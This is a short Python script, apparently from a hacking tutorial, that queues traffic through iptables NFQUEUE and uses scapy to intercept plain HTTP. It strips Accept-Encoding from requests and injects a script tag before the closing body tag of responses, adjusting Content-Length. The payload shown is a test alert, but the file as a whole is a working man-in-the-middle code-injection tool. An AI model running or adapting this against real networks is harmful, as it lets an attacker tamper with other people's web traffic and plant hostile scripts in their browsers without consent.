#!/usr/bin/env python3
'''
iptables -I INPUT -j NFQUEUE --queue-num 0
iptables -I OUTPUT -j NFQUEUE --queue-num 0
'''

import netfilterqueue
import scapy.all as scapy
import re

def setLoad(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	# del scapyPacket[scapy.TCP].len
	del packet[scapy.TCP].chksum
	return packet

def processPacket(packet):
	scapyPacket = scapy.IP(packet.get_payload())
	if scapyPacket.haslayer(scapy.Raw):
		try:
			load = scapyPacket[scapy.Raw].load.decode()
			if scapyPacket[scapy.TCP].dport == 80:
				print("[+] Request")
				load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

			elif scapyPacket[scapy.TCP].sport == 80:
				print("[+] Response") 
				injectionCode = "<script>alert('test');</script>"
				load = load.replace("</body>",injectionCode + "</body>")
				contentLengthSearch = re.search("(?:Content-Length:\s)(\d*)", load)
				if contentLengthSearch and "text/html" in load:
					contentLength = contentLengthSearch.group(1)
					newContentLength = int(contentLength) + len(injectionCode)
					load = load.replace(contentLength, str(newContentLength))

			if load != scapyPacket[scapy.Raw].load:
				newPacket = setLoad(scapyPacket, load)
				packet.set_payload(bytes(newPacket))
		except UnicodeDecodeError:
			pass

	packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processPacket)
queue.run()